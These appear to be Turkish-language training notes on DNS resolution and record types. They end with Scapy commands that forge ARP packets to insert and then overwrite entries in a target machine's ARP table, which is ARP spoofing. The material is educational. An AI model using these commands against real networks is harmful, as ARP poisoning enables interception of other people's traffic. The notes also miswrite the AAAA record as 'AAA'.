**3.Gün  22.07.2018**

DNS, UDP’den ve TCP’den çalışabilir

Bir protocol bir katmanda olacak diye birşey yok birden fazla katmanda da yeralabilir.

Gateway: LAN (=Local Area Network) ağında ki diğer bilgisayarlarla iletişim için veri paketlerinin ağ (network) dışına çıkmasını sağlayan bir kapı gibi düşünülebilir.

Cloudflare'ın yeni DNS sunucusu 1.1.1.1

**DNS** nasıl çalışır: 

  - Browser öncelikle kendi lokal cache’inde ilgili adres için IP’nin bulunup bulunmadığına bakar. 
  - İstenen bilgi bulunamazsa bilgisayarda tanımlı olan DNS sunucuya (bu sunucu genellikle internet sağlayıcınızın -ISP- DNS adresi     olur) recursive olarak istek atılır. 
  - İstenen bilgi burada da bulunamaz ise bir üst sunucuya istekte bulunur. 
  - İstenen cevap zincirdeki sunucularda bulunamazsa kaydı tutan asıl sunucuya kadar gidiler, cevap bulunur ve dönülür.

DNS isteğine verilen cevapta TTL (time-to-live) olarak bulunur. 

TTL süresi DNS kaydının sahibi tarafından belirlenir.

DNS kayıt tipleri: **A**, **AAA**, **NS**, **CNAME**, **SRV**, **TXT**, **MX**

**A** kaydı en çok kullanılan ve bilinen IPv4 adresi dönen kayıt sorgusudur.

**AAA** kaydı IPv6 adresi dönen kayıt sorgusudur.

**NS**: Network üzerinde bulunan ve kullanım da olan DNS Serverları tanımlar.

**CNAME** kaydı: Farklı domain'leri tek bir domain'de birleştirmek için kullanılır. 

Örnek: linux․org.tr ve www․linux.org.tr gibi iki farklı adresi CNAME ile tek linux.org․tr'de birleştirilebilir.

CNAME'i aynı zamanda farklı bir domain'e yönlendirme amacı ile de kullanılabilir. 

**SRV** kaydı sunucu tarafından sunulan bir servisin adres, protokol ve port bilgisini döner.

**TXT** kayıtları özel amaçlı kayıtlardır. Genellikle spam e-posta gönderimlerini engellemek için oluşturulmuş kurallardan biri olan “SPF” kayıtlarını tanımlamak için kullanılır.

**MX** kaydı: Alan adına ait mail adreslerinin çalıştığı mail sunucularını adresleyen bir DNS kaydıdır.

DNS kayıtlarını sorgulamak için nslookup veya dig adlı programlar kullanılabilir.

**IPS** trafiğe ait paketleri inceler, uygulamalara yönelik zararlı paketleri raporlar ve ağ içerisine girişini engeller.

**OP Code** (Operation Code), işlem kodu, bilgisayar teknolojisinde makine dili komutunun, gerçekleştirilecek işlemi belirten kısmıdır.


**Scapy ile Karşı Makinenin ARP tablosuna IP eklemek için**:
```
$ scapy
>>> etherbaslik= Ether(dst="ff:ff:ff:ff:ff:ff",src=<"SRC_MAC_ADDR")
>>> arpbaslik=ARP(op=1,hwdst="<DEST_MAC_ADDR>",psrc="<DEFAULT_IP>",pdst="<TARGET_IP>",hwsrc="<SRC_MAC_ADDR>"
>>> paket = etherbaslik/arpbaslik
>>> sendp(paket,iface="eth0")
.
Sent 1 packets.
```

**Scapy ile Karşı Makine ARP tablosunda IP adresinin MAC adresini değiştirmek için**:

**NOT:** Karşı makinenin ARP tablosunda Kaynak IP adresinin tanımlı olması gerekir.

Bunun için; **ping -c 1 <DEST_IP>**
```
$scapy
>> etherbaslik=Ether(dst=<"DEST_MAC_ADDR">,src="31:31:30:30:30:31")
>>> arpbaslik=ARP(op=2,hwsrc="31:31:30:30:30:31",psrc=<"SRC_IP_ADDR">,pdst=<"DEST_IP_ADDR">)
>>> paket=etherbaslik/arpbaslik
>>> sendp(paket,iface="eth0")
.
Sent 1 packets.
```
